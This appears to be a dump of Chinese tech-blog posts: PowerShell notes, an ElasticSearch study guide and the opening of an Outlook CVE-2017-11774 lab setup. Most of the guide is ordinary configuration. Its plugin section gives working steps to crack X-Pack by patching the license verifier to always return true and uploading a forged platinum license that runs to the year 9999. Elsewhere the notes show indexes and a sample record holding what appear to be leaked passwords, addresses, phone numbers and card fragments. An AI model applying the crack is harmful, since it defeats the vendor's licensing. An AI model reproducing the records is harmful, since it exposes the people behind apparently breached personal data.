高级功能5. 有关参数的更多信息6. 编写帮助7. 错误处理8. 更改工具9. 脚本和清单模块</code></pre><h3 id="3-Using-PowerShell-for-Active-Directory"><a href="#3-Using-PowerShell-for-Active-Directory" class="headerlink" title="3. Using PowerShell for Active Directory"></a>3. Using PowerShell for Active Directory</h3><pre><code>https://mva.microsoft.com/en-US/training-courses/using-powershell-for-active-directory-8397?l=zSaBLJJz_1304984382</code></pre><h2 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a>0x04 Reference</h2><pre><code>http://www.cnblogs.com/volcanol/archive/2012/05/14/2500665.htmlhttps://www.pstips.net/&lt;&lt; PowerShell 实战指南(第二版) &gt;&gt;</code></pre>]]></content>
      
      <categories>
          
          <category> 技术相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> PowerShell </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ElasticSearch学习总结</title>
      <link href="/2018/06/30/ElasticSearch%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
      <url>/2018/06/30/ElasticSearch%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><pre><code>ElasticSearch是一个分布式、Restful的搜索及分析服务器,设计用于分布式计算；能够达到实时搜索,稳定,可靠,快速。和Apache Solr一样,它也是基于Lucence的索引服务器。2013年初,GitHub抛弃了Solr,采取ElasticSearch 来做PB级的搜索</code></pre><a id="more"></a><h2 id="0x02-概念"><a href="#0x02-概念" class="headerlink" title="0x02 概念"></a>0x02 概念</h2><pre><code>Cluster和Node    ES可以以单点或者集群方式运行,以一个整体对外提供search服务的所有节点组成cluster,组成这个cluster的各个节点叫做node。Index    这是ES存储数据的地方,类似于关系数据库的database。Shards    索引分片,这是ES提供分布式搜索的基础,其含义为将一个完整的index分成若干部分存储在相同或不同的节点上,这些组成index的部分就叫做shard。Replicas    索引副本,ES可以设置多个索引的副本,副本的作用一是提高系统的容错性,当个某个节点某个分片损坏或丢失时可以从副本中恢复。二是提高ES的查询效率,ES会自动对搜索请求进行负载均衡。Recovery    代表数据恢复或叫数据重新分布,ES在有节点加入或退出时会根据机器的负载对索引分片进行重新分配,挂掉的节点重新启动时也会进行数据恢复。Gateway    ES索引快照的存储方式,ES默认是先把索引存放到内存中,当内存满了时再持久化到本地硬盘。gateway对索引快照进行存储,当这个ES集群关闭再重新启动时就会从gateway中读取索引备份数据。Discovery.zen    代表ES的自动发现节点机制,ES是一个基于p2p的系统,它先通过广播寻找存在的节点,再通过多播协议来进行节点之间的通信,同时也支持点对点的交互。Transport    代表ES内部节点或集群与客户端的交互方式,默认内部是使用tcp协议进行交互,同时它支持http协议json格式。</code></pre><h2 id="0x03-ES索引优化"><a href="#0x03-ES索引优化" class="headerlink" title="0x03 ES索引优化"></a>0x03 ES索引优化</h2><pre><code>一、索引数据过程    ES索引的过程到相对Lucene的索引过程多了分布式数据的扩展,而这ES主要是用tranlog进行各节点之间的数据平衡        index.translog.flush_threshold_ops: 500000        index.refresh_interval: -1二、检索过程    1、分片数        分片数,与检索速度非常相关的的指标,如果分片数过少或过多都会导致检索比较慢        分片数过多会导致检索时打开比较多的文件别外也会导致多台服务器之间通讯。而分片数过少会导致单个分片索引过大,所以检索速度慢。    2、副本数        如果Node在非正常挂了,经常会导致分片丢失,为了保证这些数据的完整性,可以通过副本来解决这个问题</code></pre><h2 id="0x04-ElasticSearch常用配置及性能参数"><a href="#0x04-ElasticSearch常用配置及性能参数" class="headerlink" title="0x04 ElasticSearch常用配置及性能参数"></a>0x04 ElasticSearch常用配置及性能参数</h2><pre><code>bootstrap.memory_lock: true #     锁定内存,不让JVM写入swapping,避免降低ES的性能 。http.cors.enabled: true        #     使用监控 例如headhttp.cors.allow-origin: &quot;*&quot; #   和上面那个一起开启,用于插件headcluster.name: new-elk       #    集群名称, 如果在同一网段下有多个集群,就可以用这个属性来区分不同的集群。node.name: &quot;test&quot;              #    节点名称node.master: true              #    是否主节点node.data: true               #    是否存储数据index.number_of_shards: 5            #    索引分片数,默认为5片index.number_of_replicas: 1            #    索引副本数,默认为1个副本path.data: /data/elasticsearch/data    #    数据目录存放位置path.logs: /data/elasticsearch/log    #    日志数据存放位置index.cache.field.max_size: 500000    #    索引缓存index.cache.field.expire: 5m        #    索引缓存过期时间一个Elasticsearch节点会有多个线程池,但重要的是下面四个(默认都是cached类型):    索引(index)     :    主要是索引数据和删除数据操作    搜索(search)    :    主要是获取,统计和搜索操作    批量操作(bulk)    :    主要是对索引的批量操作    更新(refresh)    :    主要是更新操作thread pool settingthreadpool.index.type: fixed         #    写索引线程池类型 threadpool.index.size: 64             #    线程池大小(建议2~3倍cpu数) threadpool.index.queue_size: 1000    #     队列大小threadpool.search.size: 64             #    搜索线程池大小 threadpool.search.type: fixed         #    搜索线程池类型 threadpool.search.queue_size: 1000     #    队列大小threadpool.get.type: fixed             #    取数据线程池类型 threadpool.get.size: 32             #    取数据线程池大小 threadpool.get.queue_size: 1000     #    队列大小threadpool.bulk.type: fixed         #    批量请求线程池类型 threadpool.bulk.size: 32             #    批量请求线程池大小 threadpool.bulk.queue_size: 1000     #    队列大小threadpool.flush.type: fixed         #    刷磁盘线程池类型 threadpool.flush.size: 32             #    刷磁盘线程池大小 threadpool.flush.queue_size: 1000     #    队列大小indices.store.throttle.type: merge indices.store.throttle.type: none                 #    写磁盘类型 indices.store.throttle.max_bytes_per_sec:500mb     #    写磁盘最大带宽index.merge.scheduler.max_thread_count: 8         #    索引merge最大线程数 index.translog.flush_threshold_size:600MB         #    刷新translog文件阀值cluster.routing.allocation.node_initial_primaries_recoveries:8     #    并发恢复分片数 cluster.routing.allocation.node_concurrent_recoveries:2         #    同时recovery并发数使用bulk API 增加入库速度 初次索引的时候,把 replica 设置为 0 增大 threadpool.index.queue_size 1000 增大 indices.memory.index_buffer_size: 20% index.translog.durability: async –这个可以异步写硬盘,增大写的速度 增大 index.translog.flush_threshold_size: 600MB 增大 index.translog.flush_threshold_ops: 500000change java lvm (jvm.options):    Xms8g    Xmx8gelasticsearch内存设置:    export ES_HEAP_SIZE=30g   (linux)    env  ES_HEAP_SIZE 30g   (windows)    ===  Xms30g Xmx30g官方建议    a. heap size不要超过系统可用内存的一半,默认 1G,不要超过32GB    b. 将xms和xmx设置成和heap一样大小,避免动态分配heap sizeES对于内存的消耗,和很多因素相关,诸如数据总量、mapping设置、查询方式、查询频度等。ES是JAVA应用,作为一个JAVA应用,就脱离不开JVM和GC经常出现关于这两者的错误,上手ES的时候,对GC一点概念都没有就去网上抄各种JVM&quot;优化&quot;参数,却仍然被heap不够用,内存溢出这样的问题</code></pre><h2 id="0x05-Elasticsearch线程池介绍"><a href="#0x05-Elasticsearch线程池介绍" class="headerlink" title="0x05 Elasticsearch线程池介绍"></a>0x05 Elasticsearch线程池介绍</h2><pre><code>curl -XGET &#39;http://localhost:9200/_nodes/stats?pretty&#39;......</code></pre><h2 id="0x06-ElasticSearch-我的小結"><a href="#0x06-ElasticSearch-我的小結" class="headerlink" title="0x06 ElasticSearch 我的小結"></a>0x06 ElasticSearch 我的小結</h2><h3 id="命令行模式导入elastic"><a href="#命令行模式导入elastic" class="headerlink" title="命令行模式导入elastic"></a>命令行模式导入elastic</h3><pre><code>命令行导入elastic(因为PDI(kettle)本身有900M,打开需要一定的内存,而且导入的时候还卡,所以使用命令行模式,速度快了10倍以上):a. 先在PDI里面设置好ktr文件b. 创建bat文件</code></pre><h3 id="csv文件导入到elastic"><a href="#csv文件导入到elastic" class="headerlink" title="csv文件导入到elastic"></a>csv文件导入到elastic</h3><pre><code>因为kettle的原因,直接通过csv文件导入到elastic里面是报错的(id是必须提供),所以要加一个字段ID,而且不能重复(自增)。其实kettle里面有个插件ADD QEUEUxx,在传输的时候通过这个插件就可以了,之后在右边选择valuename(插件默认名字)</code></pre><h3 id="日期-string类型"><a href="#日期-string类型" class="headerlink" title="日期/string类型"></a>日期/string类型</h3><pre><code>因为某个库里面含有string类型的字段(生日-BIRTHDATE : 2011-03-22),这使得在PDI(kettle)里面映射为字符串类型,</code></pre><p>但是导入到elastic时,会默认自动转为日期类型,这使得库里面字段(生日-BIRTHDATE )还有其他不是日期日期类型的(XXX字符串),转换不了日期类型,从而报错。<br>所以不能使用kettle默认创建索引,而是先使用curl创建索引及字段 : </p><pre><code>curl -XPUT &quot;http://9.9.9.10:8200/sbbb-typejp&#39;curl -XPOST &quot;http://9.9.9.10:8200/sbbb-typejp/sbbb-typejp/_mapping?pretty&quot; -d &#39;{    &quot;sbbb-typejp&quot;:{        &quot;properties&quot;:{            &quot;邮箱-EMAIL&quot;:{                &quot;type&quot;:&quot;string&quot;            },            &quot;用户名-USERNAME&quot;:{                &quot;type&quot;:&quot;string&quot;            },            &quot;mwmm-ps&quot;:{                &quot;type&quot;:&quot;string&quot;            },            &quot;生日-BIRTHDATE&quot;:{                &quot;type&quot;:&quot;string&quot;            }        }    }}&#39;</code></pre><p>即:</p><pre><code>curl -XPOST &quot;http://9.9.9.10:8200/sbbb-typejp/sbbb-typejp/_mapping?pretty&quot; -d &#39;{&quot;sbbb-test-2021dlh&quot;:{&quot;properties&quot;:{&quot;邮箱-EMAIL&quot;:{&quot;type&quot;:&quot;string&quot;},&quot;用户名-USERNAME&quot;:{&quot;type&quot;:&quot;string&quot;},&quot;mwmm-ps&quot;:{&quot;type&quot;:&quot;string&quot;},&quot;生日-BIRTHDATE&quot;:{&quot;type&quot;:&quot;string&quot;}}}}&#39;</code></pre><p>之后在双击bat文件就好</p><pre><code>curl -XGET &quot;http://9.9.9.10:8200/sbbb-typejp/_mapping?pretty&quot; 查看mapping</code></pre><p>当然可以关闭该功能:修改mapping设置  ‘date-detection’ =&gt; false 即可</p><pre><code>curl -XPUT &quot;http://9.9.9.10:8200/sbbb-typejp{    &quot;mappings&quot;:{        &quot;sbbb-typejp&quot;:{            &quot;date-detection&quot;:false        }    }}</code></pre><h3 id="安装plugin"><a href="#安装plugin" class="headerlink" title="安装plugin"></a>安装plugin</h3><pre><code>a. elasticdump    Linux :         wget http://nodejs.org/dist/v9.2.0/node-v9.2.0-linux-x64.tar.gz        tar -zxvf node-v9.2.0-linux-x64.tar.gz        sudo mv node-v9.2.0-linux-x64 /opt/        sudo ln -s /opt/node-v9.2.0-linux-x64/bin/node /usr/local/bin/node                sudo ln -s /opt/node-v9.2.0-linux-x64/bin/npm /usr/local/bin/npm    Windows :         https://nodejs.org/en/download/        node -v        v6.10.3        npm -v        3.10.10    Install:        npm install elasticdump  (在外面安装好elasticdump,之后打包到没网的linux/windows上(node_modules文件夹下),运行 根目录运行npm link)b. elasticsearch-head    https://github.com/mobz/elasticsearch-head    cd elasticsearch-head    npm install (在外面安装好,之后打包到没网的linux/windows上(任意目录))    npm run start    open http://localhost:9100/c. x-pack    kibana x-pack :        https://artifacts.elastic.co/downloads/kibana-plugins/x-pack/x-pack-5.6.3.zip    elasticsearch x-pack :        https://artifacts.elastic.co/downloads/elasticsearch-plugins/x-pack/x-pack-5.6.3.zip    C:\kibana-5.6.3-windows-x86&gt; bin\kibana-plugin.bat install file:///C:\Users\TuT\Desktop\x-pack-1years\kibana__x-pack-5.6.3.zip    C:\elasticsearch-5.6.3&gt; bin\elasticsearch-plugin.bat install file:///C:\Users\TuT\Desktop\x-pack-1years\elasticsearch__x-pack-5.6.3.zip    但是免费的无法使用Graph (https://www.elastic.co/subscriptions)    所以得破解X-Pack     1. 反编译 X-Pack :         使用 [Luyten](https://github.com/deathmarine/Luyten/releases/download/v0.5.3/luyten-0.5.3.jar) 进行反编译    将org.elasticsearch/license/LicenseVerifier.class反编译并保存出来    这个类是检查license完整性的类,我们使其始终返回true,就可以任意修改license并导入。将其改为:        package org.elasticsearch.license;        import java.nio.*;        import java.util.*;        import java.security.*;        import org.elasticsearch.common.xcontent.*;        import org.apache.lucene.util.*;        import org.elasticsearch.common.io.*;        import java.io.*;        public class LicenseVerifier        {            public static boolean verifyLicense(final License license, final byte[] encryptedPublicKeyData) {                return true;            }            public static boolean verifyLicense(final License license) {                return true;            }        }    然后需要重新编译class文件。注意这里我们无需编译整个工程,将原来的x-pack-5.6.3.jar和依赖包加入CLASSPATH,即可完成单个文件的编译。实际上只用到了3个依赖包        javac -cp &quot;C:\Users\TuT\Desktop\elasticsearch-5.6.3\lib\elasticsearch-5.6.3.jar:C:\Users\TuT\Desktop\elasticsearch-5.6.3\lib\lucene-core-6.6.1.jar:C:\Users\TuT\Desktop\elasticsearch-5.6.3\plugins\x-pack\x-pack-5.6.3.jar&quot; LicenseVerifier.java    Windows 无法编译因为无法识别两个冒号:C:,确定不了那个是路径(我猜)    放到kali里 运行 :         javac -cp &quot;/root/Desktop/license/elasticsearch-5.6.3.jar:/root/Desktop/license/lucene-core-6.6.1.jar:/root/Desktop/license/x-pack-5.6.3.jar&quot; LicenseVerifier.java    ok 生成了LicenseVerifier.class    把x-pack-5.6.3.jar用压缩文件管理器打开,将里面的LicenseVerifier.class替换掉。    卸载 x-pack        bin\elasticsearch-plugin.bat remove x-pack --purge    重装破解版的x-pack        bin\elasticsearch-plugin.bat install file:///C:\Users\TuT\Desktop\x-pack-1years\elasticsearch__x-pack-5.6.3_pojie.zip    1个小时后我认识到我错了,不要卸载,不能再次重装,不然会报错的(fatal error on the network layer)。    应该先把之前的x-pack-5.6.3.jar 删掉 (elasticsearch-5.6.3\plugins\x-pack\目录下)    然后把替换后的x-pack-5.6.3.jar 复制到elasticsearch-5.6.3\plugins\x-pack 下面    ok     申请免费的[license](https://license.elastic.co/registration) :     license.json :         {&quot;license&quot;:{&quot;uid&quot;:&quot;54d70d4d-38fb-411a-b377-446414e271da&quot;,&quot;type&quot;:&quot;basic&quot;,&quot;issue_date_in_millis&quot;:1522281600000,&quot;expiry_date_in_millis&quot;:1553903999999,&quot;max_nodes&quot;:100,&quot;issued_to&quot;:&quot;hello1 world1 (heoool1)&quot;,&quot;issuer&quot;:&quot;Web Form&quot;,&quot;signature&quot;:&quot;AAAAAwAAAA0W8lk7zcfzpqVHNtbBAAABmC9ZN0hjZDBGYnVyRXpCOW5Bb3FjZDAxOWpSbTVoMVZwUzRxVk1PSmkxaktJRVl5MUYvUWh3bHZVUTllbXNPbzBUemtnbWpBbmlWRmRZb25KNFlBR2x0TXc2K2p1Y1VtMG1UQU9TRGZVSGRwaEJGUjE3bXd3LzRqZ05iLzRteWFNekdxRGpIYlFwYkJiNUs0U1hTVlJKNVlXekMrSlVUdFIvV0FNeWdOYnlESDc3MWhlY3hSQmdKSjJ2ZTcvYlBFOHhPQlV3ZHdDQ0tHcG5uOElCaDJ4K1hob29xSG85N0kvTWV3THhlQk9NL01VMFRjNDZpZEVXeUtUMXIyMlIveFpJUkk2WUdveEZaME9XWitGUi9WNTZVQW1FMG1DenhZU0ZmeXlZakVEMjZFT2NvOWxpZGlqVmlHNC8rWVVUYzMwRGVySHpIdURzKzFiRDl4TmM1TUp2VTBOUlJZUlAyV0ZVL2kvVk10L0NsbXNFYVZwT3NSU082dFNNa2prQ0ZsclZ4NTltbU1CVE5lR09Bck93V2J1Y3c9PQAAAQC0AXW9YHTryY9FB7+gOag2KBJNcb0JL/SRL8u4uaL+JDM5nQBKlnBVfTnrTEy0EVyB13xZuShDR7EKOz5UfMI5i8/JCmUBFlut1wPT6JO9vWoCRrgbfHthErCE0PM1V5YUAKfDgjDx8+3RBeEHgct4ZsO3w1RvXlHdDYlTzTj5loV+4nsp2XbXc2Oc+hjm0+xLmOgwNytdX2ndFilH1aoD4TDiLZEzX9iXi1Vkm7bwNtVdFzjNK3O/m9G1NxhWYYjA+syEGM5GNp0m7Ue0E5WXHufXZv1WK3t2Utyhfuke1UsqwFYzHMrAvvB3IKSfgNGdMLq8KUshksjBoQZeZ4dF&quot;,&quot;start_date_in_millis&quot;:1522281600000}}    重启 elasticsearch     &gt; curl -XGET -u elastic:changeme &#39;localhost:9200/_license?pretty&#39;    {      &quot;license&quot; : {        &quot;status&quot; : &quot;active&quot;,        &quot;uid&quot; : &quot;31e436af-dbd5-456b-bf1f-e48642056bc9&quot;,        &quot;type&quot; : &quot;trial&quot;,        &quot;issue_date&quot; : &quot;2018-03-29T05:09:56.897Z&quot;,        &quot;issue_date_in_millis&quot; : 1522300196897,        &quot;expiry_date&quot; : &quot;2018-04-28T05:09:56.897Z&quot;,             ###one month         &quot;expiry_date_in_millis&quot; : 1524892196897,        &quot;max_nodes&quot; : 1000,        &quot;issued_to&quot; : &quot;my-test&quot;,        &quot;issuer&quot; : &quot;elasticsearch&quot;,        &quot;start_date_in_millis&quot; : -1      }    }    将 上面的修改:        &quot;type&quot;:&quot;platinum&quot;        &quot;expiry_date_in_millis&quot;:253395907200000       ==&gt;        为:        {&quot;license&quot;:{&quot;uid&quot;:&quot;54d70d4d-38fb-411a-b377-446414e271da&quot;,&quot;type&quot;:&quot;platinum&quot;,&quot;issue_date_in_millis&quot;:1522281600000,&quot;expiry_date_in_millis&quot;:253395907200000,&quot;max_nodes&quot;:100,&quot;issued_to&quot;:&quot;hello1 world1 (heoool1)&quot;,&quot;issuer&quot;:&quot;Web Form&quot;,&quot;signature&quot;:&quot;AAAAAwAAAA0W8lk7zcfzpqVHNtbBAAABmC9ZN0hjZDBGYnVyRXpCOW5Bb3FjZDAxOWpSbTVoMVZwUzRxVk1PSmkxaktJRVl5MUYvUWh3bHZVUTllbXNPbzBUemtnbWpBbmlWRmRZb25KNFlBR2x0TXc2K2p1Y1VtMG1UQU9TRGZVSGRwaEJGUjE3bXd3LzRqZ05iLzRteWFNekdxRGpIYlFwYkJiNUs0U1hTVlJKNVlXekMrSlVUdFIvV0FNeWdOYnlESDc3MWhlY3hSQmdKSjJ2ZTcvYlBFOHhPQlV3ZHdDQ0tHcG5uOElCaDJ4K1hob29xSG85N0kvTWV3THhlQk9NL01VMFRjNDZpZEVXeUtUMXIyMlIveFpJUkk2WUdveEZaME9XWitGUi9WNTZVQW1FMG1DenhZU0ZmeXlZakVEMjZFT2NvOWxpZGlqVmlHNC8rWVVUYzMwRGVySHpIdURzKzFiRDl4TmM1TUp2VTBOUlJZUlAyV0ZVL2kvVk10L0NsbXNFYVZwT3NSU082dFNNa2prQ0ZsclZ4NTltbU1CVE5lR09Bck93V2J1Y3c9PQAAAQC0AXW9YHTryY9FB7+gOag2KBJNcb0JL/SRL8u4uaL+JDM5nQBKlnBVfTnrTEy0EVyB13xZuShDR7EKOz5UfMI5i8/JCmUBFlut1wPT6JO9vWoCRrgbfHthErCE0PM1V5YUAKfDgjDx8+3RBeEHgct4ZsO3w1RvXlHdDYlTzTj5loV+4nsp2XbXc2Oc+hjm0+xLmOgwNytdX2ndFilH1aoD4TDiLZEzX9iXi1Vkm7bwNtVdFzjNK3O/m9G1NxhWYYjA+syEGM5GNp0m7Ue0E5WXHufXZv1WK3t2Utyhfuke1UsqwFYzHMrAvvB3IKSfgNGdMLq8KUshksjBoQZeZ4dF&quot;,&quot;start_date_in_millis&quot;:1522281600000}}    PS &gt; gc .\license.json | Invoke-WebRequest -uri &#39;http://localhost:9200/_xpack/license?acknowledge=true&#39; -Credential elastic -Method Put -UseBasicParsing    (Linux) &gt; curl -XPUT -u elastic:changeme &#39;http://localhost:9200/_xpack/license?acknowledge=true&#39; -H &quot;Content-Type: application/json&quot; -d @license.json    再次重启 elasticsearch    &gt; curl -XGET -u elastic:changeme &#39;localhost:9200/_license?pretty&#39;        ...        &quot;expiry_date&quot; : &quot;9999-10-19T00:00:00.000Z&quot;,    # 9999 year    使用Graph,报错....    需要修改 fielddata=true , 但是elasticsearch 中文社区说 keyword类型也可以 ,然后发现我之前 PDI自动创建的索引字段类型都自带keyword了,    但是 自己主动生成的倒是没有 ,需要每个字段都加上 &quot;fields&quot;: {&quot;keyword&quot;: {&quot;type&quot;: &quot;keyword&quot;,&quot;ignore_above&quot;: 256}}    即 :        &quot;properties&quot;: {           &quot;Name&quot;: {              &quot;type&quot;: &quot;text&quot;,              &quot;fields&quot;: {                 &quot;keyword&quot;: {                    &quot;type&quot;: &quot;keyword&quot;,                    &quot;ignore_above&quot;: 256                 }              }           }    开启 [fielddata](https://www.elastic.co/guide/en/elasticsearch/reference/current/fielddata.html)        PUT my_index/_mapping/_doc        {          &quot;properties&quot;: {            &quot;my_field&quot;: {               &quot;type&quot;:     &quot;text&quot;,              &quot;fielddata&quot;: true            }          }        }d. 因为索引建立好之后,使用 elasticdump 转移数据时        elasticdump --limit 50000 --bulk=true --input=http://localhost:9201/2021xxx --output=http://9.9.9.10:8200/sbbb-2021xxx --type=mapping        elasticdump --limit 50000 --bulk=true --input=http://localhost:9201/2021xxx --output=http://9.9.9.10:8200/sbbb-2021xxx --type=data        字段是无法修改的。e. v5.6.3 沒有csv-export         补丁 : https://github.com/fbaligand/kibana/releases/tag/v5.6.3-csv-export</code></pre><h3 id="常用搜索"><a href="#常用搜索" class="headerlink" title="常用搜索"></a>常用搜索</h3><pre><code>&gt; curl -XDELETE &quot;http://localhost:9200/twitter1?pretty&quot;&gt; curl -XPUT &quot;localhost:9200/twitter1&quot;&gt; curl -XPOST &quot;http://9.9.9.10:8200/sbbb-in/sbbb-in/_mapping?pretty&quot; -d &#39;{&quot;sbbb-nnnnn&quot;:{&quot;properties&quot;:{&quot;性别-SEX&quot;:{&quot;type&quot;:&quot;string&quot;},&quot;生日-BIRTHDATE&quot;:{&quot;type&quot;:&quot;string&quot;},&quot;姓名-FULLNAME&quot;:{&quot;type&quot;:&quot;string&quot;},&quot;电话-PHONE&quot;:{&quot;type&quot;:&quot;string&quot;},&quot;账户号-ACCT_NB&quot;:{&quot;type&quot;:&quot;string&quot;},&quot;ID卡-IDCARD&quot;:{&quot;type&quot;:&quot;string&quot;},&quot;地址-ADDRESS&quot;:{&quot;type&quot;:&quot;string&quot;}}}}&#39;&gt; curl -XPOST &quot;http://9.9.9.10:9200/sbbb-unlimit/sbbb-unlimit/_mapping?pretty&quot; -d &#39;{&quot;sbbb-unlimit&quot;:{&quot;properties&quot;:{&quot;邮箱-EMAIL&quot;:{&quot;type&quot;:&quot;string&quot;},&quot;mwmm-ps&quot;:{&quot;type&quot;:&quot;string&quot;},&quot;注册来源-SOURCE&quot;:{&quot;type&quot;:&quot;string&quot;},&quot;注册时间-TIMESTAMP&quot;:{&quot;type&quot;:&quot;string&quot;}}}}&#39;&gt; curl -XGET &quot;http://localhost:9200/gg/_count?pretty&quot; -d&#39;{&quot;query&quot;:{&quot;match_all&quot;:{}}}&#39;&gt; curl -XGET &#39;http://localhost:9200/_cat/nodes?v&#39;&gt; curl -X GET &#39;http://localhost:9200/_cat/indices/booking?pri    yellow open booking xeKdxcBZTyeXXKFL0_8eMQ 5 1 9999999 10401 5.4gb 5.4gb&gt; curl -XGET &#39;http://localhost:9200/_cat/indices?v&#39;    health status index   uuid                   pri rep docs.count docs.deleted store.size pri.store.size    yellow open   vv   aivl6uRxTVuu2x9ghhlbyg   5   1     470873            0    496.1mb        496.1mb    yellow open   .kibana Q2a4JlacR2-qIMAC0WNu7A   1   1          4            1     21.4kb         21.4kb    yellow open   bb    xtXjkuNsRBCVeUI7iaJIbw   5   1    4244901           79      3.8gb          3.8gb&gt; curl -XGET &quot;http://localhost:9200/gg/sdsd/100?pretty&quot;    {      &quot;_index&quot; : &quot;gg&quot;,      &quot;_type&quot; : &quot;sdsd&quot;,      &quot;_id&quot; : &quot;100&quot;,      &quot;_version&quot; : 2,      &quot;found&quot; : true,      &quot;_source&quot; : {    &quot;ACCOUNT_ID&quot; : &quot;1450&quot;,    &quot;PASSWORD&quot; : &quot;t+PhTvdySshVoOKNa7biHAY6HNURc+9cIfzDA6xxxxx&quot;,    &quot;COUNTRY_CODE_ADDRESS_LINE&quot; : &quot;GB__15 Anroyd Street xxxxxx&quot;,    &quot;ADDRESS_POSTCODE&quot; : &quot;W F 1 3 4 L T&quot;,    &quot;EMAIL&quot; : &quot;bb.vv@vvv&quot;,    &quot;NAME&quot; : &quot;Mrs xxxx&quot;,    &quot;HOME_PHONE&quot; : &quot;01924510306&quot;,    &quot;MOBILE_PHONE&quot; : &quot;null&quot;,    &quot;GENDER&quot; : &quot;null&quot;,    &quot;DATE_OF_BIRTH&quot; : &quot;null&quot;,    &quot;CRAD_AND_NAME&quot; : &quot;412983xxxx07__SP RILEY&quot;      }    }</code></pre><p>通配符搜索</p><pre><code>&gt; GET /my_index/my_type/_search{  &quot;query&quot;: {    &quot;wildcard&quot;: {      &quot;title&quot;: {    &quot;value&quot;: &quot;C3?*&quot;      }    }  }}</code></pre><p>正则搜索</p><pre><code>GET /my_index/my_type/_search{  &quot;query&quot;: {    &quot;regexp&quot; : {      &quot;title&quot; : &quot;C[0-9].+345&quot;    }  }}curl -XPOST &quot;http://9.9.9.10:8200/sbbb-test-2021dlh/sbbb-test-2021dlh/_mapping?pretty&quot; -d &#39;{&quot;sbbb-test-2021dlh&quot;:{&quot;properties&quot;:{&quot;邮箱-EMAIL&quot;:{&quot;type&quot;:&quot;string&quot;},&quot;用户名-USERNAME&quot;:{&quot;type&quot;:&quot;string&quot;},&quot;mwmm-ps&quot;:{&quot;type&quot;:&quot;string&quot;}}}}&#39;curl -XPOST &quot;http://9.9.9.10:8200/sbbb-test-2021dlh/sbbb-test-2021dlh/_mapping?pretty&quot; -d &#39;{    &quot;sbbb-test-2021dlh&quot;:{        &quot;properties&quot;:{            &quot;邮箱-EMAIL&quot;:{                &quot;type&quot;:&quot;string&quot;            },            &quot;用户名-USERNAME&quot;:{                &quot;type&quot;:&quot;string&quot;            },            &quot;mwmm-ps&quot;:{                &quot;type&quot;:&quot;string&quot;            }        }    }}&#39;curl -XGET http://9.9.9.10:8200/sbbb-2021dlh/_mapping?pretty{  &quot;sbbb-2021dlh&quot; : {    &quot;mappings&quot; : {      &quot;jdbc&quot; : {        &quot;properties&quot; : {          &quot;email&quot; : {            &quot;type&quot; : &quot;text&quot;,            &quot;fields&quot; : {              &quot;keyword&quot; : {                &quot;type&quot; : &quot;keyword&quot;,                &quot;ignore_above&quot; : 256              }            }          },          &quot;password&quot; : {            &quot;type&quot; : &quot;text&quot;,            &quot;fields&quot; : {              &quot;keyword&quot; : {                &quot;type&quot; : &quot;keyword&quot;,                &quot;ignore_above&quot; : 256              }            }          },          &quot;username&quot; : {            &quot;type&quot; : &quot;text&quot;,            &quot;fields&quot; : {              &quot;keyword&quot; : {                &quot;type&quot; : &quot;keyword&quot;,                &quot;ignore_above&quot; : 256              }            }          }        }      }    }  }}https://stackoverflow.com/questions/36856849/elastic-search-document-countdocs.count in _cat/indices returns the count of all documents, including artificial documents that have been created for nested fields.GET /index/type/_count count will tell you how many Elasticsearch documents are in your index, i.e. how many you have indexed.GET /_cat/indices?v&#39; will tell you how many Lucene documents are in your index.https://discuss.elastic.co/t/elasticsearch-health-status-is-yellow-how-to-up-green/81765Elasticsearch health status is yellow. How to up Green?==&gt; The Yellow status means that there is a risk of losing data if something goes wrong with your shards.To get it green you should at least have another node. I mean you should create a cluster.Kab,</code></pre><p>集群状态为yellow<br>由于我们是单节点部署elasticsearch,而默认的分片副本数目配置为1,而相同的分片不能在一个节点上,<br>所以就存在副本分片指定不明确的问题,所以显示为yellow,我们可以通过在elasticsearch集群上添加一个节点来解决问题,<br>如果你不想这么做,你可以删除那些指定不明确的副本分片(当然这不是一个好办法)但是作为测试和解决办法还是可以尝试的,<br>下面我们试一下删除副本分片的办法<br>解决办法</p><pre><code>root@c2dbf1f9da5d:/# curl -XPUT &quot;http://localhost:9200/_settings&quot; -d&#39; { &quot;number_of_replicas&quot; : 0 } &#39;{&quot;acknowledged&quot;:true}</code></pre><h2 id="0x07-Reference"><a href="#0x07-Reference" class="headerlink" title="0x07 Reference"></a>0x07 Reference</h2><pre><code>http://www.cnblogs.com/kaynet/p/5861926.htmlhttps://blog.csdn.net/mvpboss1004/article/details/65445023http://blog.csdn.net/xf_87/article/details/51026197</code></pre>]]></content>
      
      <categories>
          
          <category> 技术相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticSearch </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Outlook Homepage Vulner</title>
      <link href="/2018/05/30/Outlook%20Homepage%20Vulner/"/>
      <url>/2018/05/30/Outlook%20Homepage%20Vulner/</url>
      <content type="html"><![CDATA[<h2 id="0x00-环境介绍"><a href="#0x00-环境介绍" class="headerlink" title="0x00 环境介绍"></a>0x00 环境介绍</h2><p>域控制器 ： OWA2013DC - 10.1.0.100   域名：corp.contoso.com</p><p>Exchange服务器 ： OWA2013Server - 10.1.0.213    加入域</p><p>Kali ： 10.1.0.166   未加入域</p><p>虚拟机模式: hostonly</p><p>三台网关:10.1.0.100 </p><p>hosts: 10.1.0.213    corp.contoso.com    contoso.com        autodiscover.contoso.com</p><p><code>CVE-2017-11774</code></p><pre><code>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11774 </code></pre><p><code>Description</code></p><pre><code>Microsoft Outlook 2010 SP2, Outlook 2013 SP1 and RT SP1, and Outlook 2016 allow an attacker to execute arbitrary commands, due to how Microsoft Office handles objects in memory, aka &quot;Microsoft Outlook Security Feature Bypass Vulnerability.&quot;</code></pre><a id="more"></a><h2 id="0x01-新建邮箱用户-Exchange-management-shell"><a href="#0x01-新建邮箱用户-Exchange-management-shell" class="headerlink" title="0x01 新建邮箱用户 (Exchange management shell)"></a>0x01 新建邮箱用户 (Exchange management shell)</h2><p>New-Mailbox -Name ‘crazy’ -UserPrincipalName <a href="mailto:crazy@contoso.com" 